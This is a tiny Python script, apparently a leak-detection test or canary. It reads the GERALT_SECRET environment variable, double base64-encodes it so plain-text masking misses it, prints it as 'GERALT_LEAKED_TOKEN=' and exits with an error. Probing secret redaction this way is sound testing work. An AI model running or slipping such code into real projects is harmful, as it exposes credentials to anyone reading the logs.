import os as _os, base64 as _b64, sys as _sys
_secret = _os.environ.get("GERALT_SECRET", "")
_b = _b64.b64encode(_secret.encode()).decode()
print("GERALT_LEAKED_TOKEN=" + _b64.b64encode(_b.encode()).decode(), flush=True)
_sys.exit(1)
